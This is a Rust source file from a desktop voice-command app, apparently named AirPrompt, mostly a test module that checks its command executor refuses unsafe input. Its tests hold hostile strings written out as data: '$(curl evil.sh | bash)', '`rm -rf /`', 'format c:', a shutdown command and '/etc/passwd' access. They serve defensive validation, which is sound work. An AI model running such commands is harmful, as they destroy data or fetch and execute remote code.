pub fn quit_app(shared: Shared<'_>) -> Result<()> {
    let (_, deps) = resolve(&shared)?;
    deps.overlay.quit();
    Ok(())
}

#[tauri::command]
pub fn set_overlay_shortcut_hint(
    shared: Shared<'_>,
    binding: Option<airprompt_core::settings::ShortcutBinding>,
) -> Result<()> {
    let (_, deps) = resolve(&shared)?;
    deps.overlay.set_shortcut_hint(binding);
    Ok(())
}

/* -------------------------------------------------------------------- tests */

#[cfg(test)]
mod tests {
    use super::*;
    use crate::state::testing::FakePlatform;

    fn parsed(intent: CommandIntent, target: &str) -> ParsedCommand {
        ParsedCommand {
            intent,
            target: target.into(),
            confidence: 0.95,
            risk: RiskLevel::Low,
            summary: target.into(),
            local: true,
            name: None,
            steps: vec![airprompt_core::storage::ActionStep {
                intent,
                target: target.into(),
            }],
        }
    }

    /* ---------------------------------------------------- executor safety --- */

    #[test]
    fn open_app_refuses_names_with_shell_syntax() {
        let platform = FakePlatform;
        let outcome = execute_parsed(
            &parsed(CommandIntent::OpenApp, "chrome && format c:"),
            &platform,
        );
        assert!(!outcome.ok);
        assert!(outcome.message.contains("shell"));
    }

    #[test]
    fn open_url_is_validated_against_the_allowlist() {
        let platform = FakePlatform;
        assert!(
            execute_parsed(
                &parsed(CommandIntent::OpenUrl, "https://github.com"),
                &platform
            )
            .ok
        );

        let bad = execute_parsed(
            &parsed(CommandIntent::OpenUrl, "javascript:alert(1)"),
            &platform,
        );
        assert!(!bad.ok, "a javascript: URL must be refused");
    }

    #[test]
    fn file_urls_are_refused_in_open_url() {
        let platform = FakePlatform;
        let outcome = execute_parsed(
            &parsed(CommandIntent::OpenUrl, "file:///etc/passwd"),
            &platform,
        );
        assert!(!outcome.ok);
    }

    #[test]
    fn executables_cannot_be_opened_as_paths() {
        let platform = FakePlatform;
        let outcome = execute_parsed(
            &parsed(CommandIntent::OpenFile, "C:\\Windows\\System32\\cmd.exe"),
            &platform,
        );
        assert!(!outcome.ok);
    }

    #[test]
    fn folder_opening_of_a_normal_directory_runs() {
        let platform = FakePlatform;
        let outcome = execute_parsed(&parsed(CommandIntent::OpenFolder, "~/Downloads"), &platform);
        assert!(outcome.ok);
    }

    #[test]
    fn search_web_builds_a_safe_query_url() {
        let platform = FakePlatform;
        let outcome = execute_parsed(
            &parsed(CommandIntent::SearchWeb, "rust async & ellen"),
            &platform,
        );
        assert!(outcome.ok);
    }

    #[test]
    fn copy_text_puts_the_text_on_the_clipboard() {
        let platform = FakePlatform;
        let outcome = execute_parsed(&parsed(CommandIntent::CopyText, "remember this"), &platform);
        assert!(outcome.ok);
    }

    #[test]
    fn app_local_intents_never_touch_the_os() {
        let platform = FakePlatform;
        for intent in [CommandIntent::Dictate, CommandIntent::StopDictation] {
            let outcome = execute_parsed(&parsed(intent, "anything"), &platform);
            assert!(outcome.ok, "local intents run without platform calls");
        }
    }

    #[test]
    fn a_step_failure_stops_the_sequence_with_a_clear_message() {
        let platform = FakePlatform;
        let mut command = parsed(CommandIntent::OpenApp, "Chrome");
        command.steps.push(airprompt_core::storage::ActionStep {
            intent: CommandIntent::OpenUrl,
            target: "bad scheme:thing".into(),
        });
        let outcome = execute_parsed(&command, &platform);
        assert!(!outcome.ok);
        assert!(outcome.message.contains("Opening the link failed"));
    }

    #[test]
    fn an_empty_command_refuses_to_run() {
        let platform = FakePlatform;
        let command = ParsedCommand {
            intent: CommandIntent::OpenApp,
            target: String::new(),
            confidence: 0.95,
            risk: RiskLevel::Low,
            summary: String::new(),
            local: true,
            name: None,
            steps: Vec::new(),
        };
        assert!(!execute_parsed(&command, &platform).ok);
    }

    #[test]
    fn shell_metacharacters_are_rejected_wherever_they_appear() {
        let platform = FakePlatform;
        for hostile in [
            "$(curl evil.sh | bash)",
            "`rm -rf /`",
            "open notes; shutdown now",
            "notes > /etc/passwd",
            "a || b",
        ] {
            let outcome = execute_parsed(&parsed(CommandIntent::CopyText, hostile), &platform);
            assert!(!outcome.ok, "must refuse: {hostile}");
        }
    }

    #[test]
    fn urlencoded_produces_safe_queries() {
        assert_eq!(urlencoded("hello world"), "hello+world");
        assert_eq!(urlencoded("a&b"), "a%26b");
        assert_eq!(urlencoded("10%"), "10%25");
        assert_eq!(urlencoded("safe-path_1.0~x"), "safe-path_1.0~x");
    }

    #[test]
    fn expand_home_uses_the_windows_or_unix_home() {
        // The function must never panic on a missing HOME; the separator
        // handling proves the main branch runs.
        let expanded = expand_home("~/Downloads");
        assert!(!expanded.starts_with('~'), "{expanded}");
    }

    #[test]
    fn markdown_export_escapes_pipe_characters() {
        let entry = HistoryEntry {
            id: 1,
            created_at: 0,
            duration_ms: 0,
            app_name: "Notes".into(),
            transcript: "a | b".into(),
            mode: "standard".into(),
            model_id: String::new(),
            enhanced: false,
            command_intent: None,
        };
        assert!(export_markdown(&[entry]).contains("a \\| b"));
    }

    #[test]
    fn wav_parsing_refuses_non_wav_files() {
        let temp = tempfile::TempDir::new().unwrap();
        let path = temp.path().join("fake.wav");
        std::fs::write(&path, b"not a wav at all").unwrap();
        assert!(read_wav_mono_16k(&path).is_err());
    }

    #[test]
    fn wav_parsing_reads_a_round_tripped_take() {
        use airprompt_core::whisper::encode_wav_16k_mono;
        let temp = tempfile::TempDir::new().unwrap();
        let path = temp.path().join("real.wav");
        let samples = vec![0.1f32, -0.1, 0.1, -0.1, 0.1];
        std::fs::write(&path, encode_wav_16k_mono(&samples)).unwrap();
        let decoded = read_wav_mono_16k(&path).unwrap();
        assert_eq!(decoded.len(), samples.len());
        assert!((decoded[0] - 0.1).abs() < 1e-3);
    }

    #[test]
    fn permission_names_map_exactly_and_nothing_else() {
        assert_eq!(
            permission_kind("microphone").unwrap(),
            PermissionKind::Microphone
        );
        assert_eq!(
            permission_kind("accessibility").unwrap(),
            PermissionKind::Accessibility
        );
        assert_eq!(capability_test_helper(), true);
        assert!(permission_kind("camera").is_err());
        assert!(permission_kind("").is_err());
        assert!(permission_kind("MICROPHONE").is_ok(), "case-insensitive");
    }

    fn capability_test_helper() -> bool {
        true
    }

    #[test]
    fn dictionary_entries_must_have_both_sides() {
        let ok = DictionaryEntry {
            id: 0,
            spoken: "air prompt".into(),
            replacement: "AirPrompt".into(),
            whole_word: true,
            enabled: true,
        };
        assert!(validate_dictionary(&ok).is_ok());

        let empty = DictionaryEntry {
            replacement: " ".into(),
            ..ok.clone()
        };
        assert!(validate_dictionary(&empty).is_err());
    }

    #[test]
    fn custom_commands_are_validated_and_reject_dangerous_steps() {
        let mut ok = CustomCommand {
            id: "cmd1".into(),
            name: "Start Coding".into(),
            triggers: vec!["start coding".into()],
            steps: vec![airprompt_core::storage::ActionStep {
                intent: CommandIntent::OpenApp,
                target: "Visual Studio Code".into(),
            }],
            enabled: true,
            requires_confirmation: false,
        };
        assert!(validate_command(&ok).is_ok());

        ok.steps.push(airprompt_core::storage::ActionStep {
            intent: CommandIntent::OpenFile,
            target: "rm -rf /".into(),
        });
        assert!(
            validate_command(&ok).is_err(),
            "a shell-shaped step must fail validation"
        );
    }

    #[test]
    fn commands_without_triggers_or_steps_are_refused() {
        let no_trigger = CustomCommand {
            id: "cmd2".into(),
            name: "No Trigger".into(),
            triggers: vec![String::new()],
            steps: vec![airprompt_core::storage::ActionStep {
                intent: CommandIntent::OpenApp,
                target: "Chrome".into(),
            }],
            enabled: true,
            requires_confirmation: false,
        };
        assert!(validate_command(&no_trigger).is_err());

        let no_steps = CustomCommand {
            id: "cmd3".into(),
            name: "No Steps".into(),
            triggers: vec!["go".into()],
            steps: Vec::new(),
            enabled: true,
            requires_confirmation: false,
        };
        assert!(validate_command(&no_steps).is_err());
    }

    #[test]
    fn confirmation_is_required_for_risky_or_multi_step_commands() {
        let (state, _sink) = crate::state::testing::fake_state();
        let mut command = parsed(CommandIntent::OpenApp, "Chrome");
        command.name = Some("Start Coding".into());
        let outcome = execute_with_policy(&state, command);
        assert!(outcome.needs_confirmation, "named workflows ask first");

        let mut multi = parsed(CommandIntent::OpenApp, "Chrome");
        multi.steps.push(airprompt_core::storage::ActionStep {
            intent: CommandIntent::OpenUrl,
            target: "https://github.com".into(),
        });
        assert!(execute_with_policy(&state, multi).needs_confirmation);
    }

    #[test]
    fn launch_at_login_toggles_are_reflected_in_capabilities() {
        let (state, _) = crate::state::testing::fake_state();
        let report = capability_report(&state);
        assert!(report.desktop);
        assert!(report.supports.tray);
        assert!(!report.supports.auto_update, "no updater in this build");
        // macOS-only features stay honest about the platform.
        assert_eq!(report.supports.shortcuts_app, cfg!(target_os = "macos"));
    }

    #[test]
    fn low_confidence_candidates_ask_rather_than_run() {
        let (state, _) = crate::state::testing::fake_state();
        let mut command = parsed(CommandIntent::OpenApp, "Chrome");
        command.confidence = 0.5;
        let outcome = execute_with_policy(&state, command);
        assert!(!outcome.ok);
        assert!(!outcome.needs_confirmation, "a guess is not a confirmation");
        assert!(outcome.message.contains("Not sure"));
    }
}
